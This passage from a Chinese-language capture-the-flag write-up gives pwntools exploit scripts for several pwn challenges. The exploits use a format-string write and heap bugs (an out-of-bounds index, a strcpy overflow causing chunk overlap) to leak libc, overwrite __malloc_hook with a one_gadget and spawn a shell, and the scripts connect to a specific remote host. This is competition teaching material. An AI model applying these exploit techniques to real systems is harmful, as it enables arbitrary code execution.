	payload  = 'Remind me to ' + '%' + str((off_2 - 27)) + 'c%55$hn' + '%' + str((off_1 - off_2)) + 'c%56$hn'
	payload  = payload.ljust(0x38,'\x00')
	payload += p64(stack + 8) + p64(stack)
	payload += p64(rce)
else:
	payload  = 'Remind me to ' + '%' + str((off_1 - 27)) + 'c%55$hn' + '%' + str((off_2 - off_1)) + 'c%56$hn'
	payload  = payload.ljust(0x38,'\x00')
	payload += p64(stack) + p64(stack + 8)
	payload += p64(rce)
p.sendlineafter('>>> ',payload)
p.interactive()
```

### Just a Galgame - 强网先锋
如果top_chunk的size 不够申请的大小,就会另外开辟一个top_chunk,将原先top_chunk扔进unsorted bin,切割后拿到libc_base,在case 5有个read(0,0x4040A0,8);往栈上写一个地址,然乎case 2没有对 index 索引进行一个 检测 越界修改这个地址里面的内容,即可将malloc_hook写为rce
```python=
from pwn import*
context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new():
	menu(1)
def edit(index,name):
	menu(2)
	p.sendlineafter('idx >>',str(index))
	p.sendafter('movie name >> ',name)
def large():
	menu(3)
def show():
	menu(4)
def leave(say):
	menu(5)
	p.sendafter('QAQ\n',say)
p = process('./main')
p = remote('123.56.170.202',52114)
libc =ELF('./libc-2.27.so')
new()
edit(0,p64(0) + p64(0xD41))
large()
new()
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook']  -0x10 - 1632
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce = libc_base + 0x10A45C
leave(p64(malloc_hook - 0x60))
edit(8,p64(rce))
new()
p.interactive()
```
### babynotes - 强网先锋
因为在regset中 strcpy 可以导致堆溢出修改下一个块的size,则可构造 chunk overlap,然后往malloc_hook中写入rce
```python=
from pwn import*
#context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(size))
def show(index):
	menu(2)
	p.sendlineafter('index:',str(index))
def free(index):
	menu(3)
	p.sendlineafter('index:',str(index))
def edit(index,content):
	menu(4)
	p.sendlineafter('index:',str(index))
	p.sendafter('note:',content)
def Set(name,motto,age):
	p.sendafter('name:',name)
	p.sendafter('motto:',motto)
	p.sendlineafter('age:',str(age))
def check():
	menu(6)
p = process('./main')
libc =ELF('./libc-2.23.so')
p = remote('123.56.170.202',43121)
Set('FMYY','FAQ',0x21)
new(0,0x100)
new(1,0x18)
new(2,0x60)
new(3,0x60)
new(4,0x60)
free(0)
new(0,0x100)
show(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x10 - 88 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce= libc_base + 0xF1207
free(0)
free(1)
menu(5)
Set('U'*0x18,'FAQ',0xE1)
free(2)
new(0,0x60)
new(1,0x60) # 1 = 3
free(1)
free(0)
free(3)
new(3,0x60)
edit(3,p64(malloc_hook - 0x23))
new(0,0x60)
new(5,0x60)
new(1,0x60)
edit(1,'\x00'*0x13 + p64(rce))
free(0)
new(0,0x60)
p.interactive()
```
